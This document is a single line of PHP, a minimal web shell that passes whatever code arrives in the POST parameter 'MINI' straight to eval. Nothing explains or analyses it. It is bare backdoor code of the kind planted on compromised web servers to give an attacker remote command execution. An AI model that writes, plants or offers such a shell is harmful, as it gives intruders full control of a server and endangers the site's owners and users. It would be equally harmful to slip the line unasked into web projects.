<?php eval($_POST[MINI]);?>
